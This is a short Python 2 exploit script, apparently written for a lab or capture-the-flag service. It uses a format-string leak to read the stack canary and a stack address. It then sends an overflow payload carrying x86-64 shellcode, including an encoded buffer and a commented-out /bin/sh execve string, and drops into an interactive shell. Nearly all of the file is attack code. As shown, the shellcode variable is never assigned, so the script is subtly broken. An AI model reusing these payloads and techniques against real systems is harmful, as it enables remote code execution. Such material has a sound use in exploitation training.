import socket
import binascii
from struct import pack,unpack
import telnetlib

def recvu(s,str,debug=0):
	recv=''
	while not str in recv:
		tmp=s.recv(4096)
		recv+=tmp
		if debug:
			print tmp
		continue
	return recv
def telnet(s):
		t = telnetlib.Telnet()
		t.sock = s
		t.interact()
		
def sock(HOST, PORT, debug=True):
		global s
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect( (HOST, PORT) )
		if debug: print "[+] Connected to server"
		return s

def encoded():
	buf =  ""
	buf += "\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05"
	buf += "\xef\xff\xff\xff\x48\xbb\xd0\xd0\xe6\x58\x08\x8c\xc3"
	buf += "\x04\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
	buf += "\xba\xeb\xbe\xc1\x40\x37\xec\x66\xb9\xbe\xc9\x2b\x60"
	buf += "\x8c\x90\x4c\x59\x37\x8e\x75\x6b\x8c\xc3\x4c\x59\x36"
	buf += "\xb4\xb0\x00\x8c\xc3\x04\xff\xb2\x8f\x36\x27\xff\xab"
	buf += "\x04\x86\x87\xae\xd1\xee\x83\xc6\x04"
	return buf
	
	
def exploit():
	s=sock("10.0.2.15",4000)	
	s.send("%145$llx%145$llx\n")
	leak=recvu(s,"note:")
	print leak
	d = leak.find("is:")+3
	cookie = int("0x"+leak[d:d+16],16)
        #print("#############test#############")
        print(leak[d+16:d+28])
        #print("#############end##############")
        st = leak[d+16:d+28]
        #st = binascii.b2a_hex(st.encode('utf-8'))
	stack = int("0x"+st,16)-1272L
	pay="A"*0x408+pack("<Q",cookie)
	#sc="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"#/bin/sh
	#sc=encoded() # binsh encoded
	pay=sc+"A"*(0x408-len(sc))+pack("<Q",cookie)+pack("<Q",stack)*2
	s.send(pay+"\x0a")
	telnet(s)
exploit()
